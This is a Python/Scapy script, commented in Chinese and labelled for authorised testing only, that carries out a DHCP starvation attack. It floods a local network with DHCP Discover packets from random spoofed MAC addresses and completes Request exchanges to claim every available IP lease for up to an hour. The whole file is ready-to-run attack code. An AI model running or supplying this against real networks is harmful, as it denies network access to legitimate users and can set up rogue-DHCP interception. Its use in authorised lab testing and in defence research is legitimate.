# -*- coding: utf-8 -*-
"""
DHCP耗尽攻击脚本 - 仅用于授权安全测试
"""

from scapy.all import *
import random
import string
import threading
import time
import sys
import signal
from Animation_v3 import Animation

# 全局配置
INTERFACE = "WLAN"  # 修改为你的网络接口
VERBOSE = False
ATTACK_DURATION = 3600  # 攻击持续时间（秒）

# 全局变量
dhcp_server_ip = None
dhcp_server_mac = None
subnet_mask = None
attack_active = True

o_print = print

def print(*args, **kwargs):
    """清空当前行"""
    o_print("\r", end='')
    o_print(*args, **kwargs)

def random_mac():
    """生成随机MAC地址[1,5](@ref)"""
    mac = [0x00, 0x16, 0x3e,
           random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def generate_hostname():
    """生成随机主机名"""
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))

def mac_to_bytes(mac_str):
    """将MAC地址字符串转换为字节格式"""
    return bytes.fromhex(mac_str.replace(':', ''))

def send_dhcp_discover():
    """发送DHCP Discover包[1,5](@ref)"""
    while attack_active:
        try:
            # 生成随机MAC和事务ID
            src_mac = random_mac()
            xid = random.randint(1, 0x7fffffff)
            hostname = generate_hostname()
            
            # 构造DHCP Discover包
            dhcp_discover = (Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
                           IP(src="0.0.0.0", dst="255.255.255.255") /
                           UDP(sport=68, dport=67) /
                           BOOTP(chaddr=mac_to_bytes(src_mac), xid=xid) /
                           DHCP(options=[("message-type", "discover"),
                                       ("hostname", hostname),
                                       "end"]))
            
            # 发送包
            sendp(dhcp_discover, iface=INTERFACE, verbose=0)
            
            if VERBOSE:
                print(f"[+] Sent DHCP Discover from MAC: {src_mac}")
                
            # 控制发送速率
            time.sleep(0.1)
            
        except Exception as e:
            print(f"[-] Error sending Discover: {e}")
            time.sleep(1)

def handle_dhcp_packet(packet):
    """处理接收到的DHCP包[1,5](@ref)"""
    global dhcp_server_ip, dhcp_server_mac, subnet_mask
    
    if packet.haslayer(DHCP):
        dhcp_options = packet[DHCP].options
        
        # 查找message-type选项
        for option in dhcp_options:
            if isinstance(option, tuple) and len(option) > 1:
                if option[0] == 'message-type':
                    message_type = option[1]
                    
                    # 处理DHCP Offer
                    if message_type == 2:  # DHCP Offer
                        dhcp_server_ip = packet[IP].src
                        dhcp_server_mac = packet[Ether].src
                        
                        # 提取子网掩码
                        for opt in dhcp_options:
                            if isinstance(opt, tuple) and opt[0] == 'subnet_mask':
                                subnet_mask = opt[1]
                                break
                        
                        client_ip = packet[BOOTP].yiaddr
                        server_ip = packet[BOOTP].siaddr
                        xid = packet[BOOTP].xid
                        client_mac = packet[BOOTP].chaddr[:6]  # 提取客户端MAC
                        
                        print(f"[+] Received DHCP Offer: {client_ip} from {dhcp_server_ip}")
                        
                        # 发送DHCP Request确认IP
                        send_dhcp_request(client_mac, xid, client_ip, server_ip)
                        
                    # 处理DHCP Ack
                    elif message_type == 5:  # DHCP Ack
                        client_ip = packet[BOOTP].yiaddr
                        print(f"[+] IP {client_ip} successfully acquired")

def send_dhcp_request(client_mac, xid, requested_ip, server_ip):
    """发送DHCP Request包[1,5](@ref)"""
    try:
        # 将字节MAC转换为字符串表示
        if isinstance(client_mac, bytes):
            client_mac_str = ':'.join(f'{b:02x}' for b in client_mac)
        else:
            client_mac_str = client_mac
            
        dhcp_request = (Ether(src=client_mac_str, dst="ff:ff:ff:ff:ff:ff") /
                       IP(src="0.0.0.0", dst="255.255.255.255") /
                       UDP(sport=68, dport=67) /
                       BOOTP(chaddr=mac_to_bytes(client_mac_str), xid=xid) /
                       DHCP(options=[("message-type", "request"),
                                   ("server_id", server_ip),
                                   ("requested_addr", requested_ip),
                                   ("hostname", generate_hostname()),
                                   "end"]))
        
        sendp(dhcp_request, iface=INTERFACE, verbose=0)
        
        if VERBOSE:
            print(f"[+] Sent DHCP Request for IP: {requested_ip}")
            
    except Exception as e:
        print(f"[-] Error sending Request: {e}")

def sniff_dhcp():
    """嗅探DHCP流量[1,5](@ref)"""
    print("[*] Starting DHCP sniffing...")
    
    # 过滤DHCP流量（端口67和68）
    dhcp_filter = "udp and (port 67 or port 68)"
    
    while attack_active:
        try:
            sniff(filter=dhcp_filter, prn=handle_dhcp_packet, 
                  store=0, timeout=10, iface=INTERFACE)
        except Exception as e:
            print(f"[-] Sniffing error: {e}")
            time.sleep(1)

def signal_handler(sig, frame):
    """处理Ctrl+C信号"""
    global attack_active
    print("\n[!] Stopping attack...")
    attack_active = False
    sys.exit(0)

def main():
    """主函数"""
    print("""
    ██████  ██   ██ ██████  ██████  ██████  
    ██   ██ ██   ██ ██   ██ ██   ██ ██   ██ 
    ██   ██ ██   ██ ██████  ██████  ██████  
    ██   ██ ██   ██ ██      ██      ██      
    ██████  ███████ ██      ██      ██      
                                            
    DHCP耗尽攻击脚本 - 仅用于授权测试
    """)
    
    # 注册信号处理器
    signal.signal(signal.SIGINT, signal_handler)
    
    # 检查权限
    # if os.getuid() != 0:
    #     print("[-] 需要root权限运行此脚本")
    #     sys.exit(1)
    
    print(f"[*] 使用接口: {INTERFACE}")
    print("[*] 启动攻击线程...")
    
    # 启动发送线程
    sender_thread = threading.Thread(target=send_dhcp_discover)
    sender_thread.daemon = True
    sender_thread.start()
    
    # 启动嗅探线程
    sniffer_thread = threading.Thread(target=sniff_dhcp)
    sniffer_thread.daemon = True
    sniffer_thread.start()

    global attack_active
    attack_active = True
    animation = Animation("攻击运行中", 10, default_chars='dots')
    animation.start()
    print("[+] 攻击运行中...按Ctrl+C停止")
    
    # 显示统计信息
    start_time = time.time()
    last_minute = -1
    
    while attack_active:
        elapsed = time.time() - start_time
        if elapsed >= ATTACK_DURATION:
            print("[+] 攻击持续时间到达，自动停止")
            attack_active = False
            break
            
        # 每分钟显示状态（避免重复输出）
        current_minute = int(elapsed / 60)
        if current_minute > last_minute:
            print(f"[*] 运行时间: {current_minute}分钟")
            last_minute = current_minute
            
        time.sleep(1)
    animation.stop()
    print("[+] 攻击完成")

if __name__ == "__main__":
    main()